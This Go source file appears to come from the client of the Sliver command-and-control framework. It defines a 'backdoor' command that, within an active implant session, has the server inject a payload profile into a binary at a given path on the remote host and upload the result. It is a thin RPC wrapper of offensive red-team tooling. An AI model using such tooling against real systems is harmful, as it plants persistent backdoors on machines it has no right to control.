package command

import (
	"context"
	"fmt"

	"github.com/bishopfox/sliver/client/spin"
	"github.com/bishopfox/sliver/protobuf/rpcpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/desertbit/grumble"
)

func binject(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
	session := ActiveSession.Get()
	if session == nil {
		fmt.Println(Warn + "Please select an active session via `use`")
		return
	}

	if len(ctx.Args) < 1 {
		fmt.Println(Warn + "Please provide a remote file path. See `help backdoor` for more info")
		return
	}

	profileName := ctx.Flags.String("profile")
	remoteFilePath := ctx.Args[0]

	ctrl := make(chan bool)
	msg := fmt.Sprintf("Backdooring %s ...", remoteFilePath)
	go spin.Until(msg, ctrl)
	backdoor, err := rpc.Backdoor(context.Background(), &sliverpb.BackdoorReq{
		FilePath:    remoteFilePath,
		ProfileName: profileName,
		Request:     ActiveSession.Request(ctx),
	})
	ctrl <- true
	<-ctrl
	if err != nil {
		fmt.Printf(Warn+"Error: %v", err)
		return
	}

	if backdoor.Response != nil && backdoor.Response.Err != "" {
		fmt.Printf(Warn+"Error: %s\n", backdoor.Response.Err)
		return
	}

	fmt.Printf(Info+"Uploaded backdoored binary to %s\n", remoteFilePath)

}
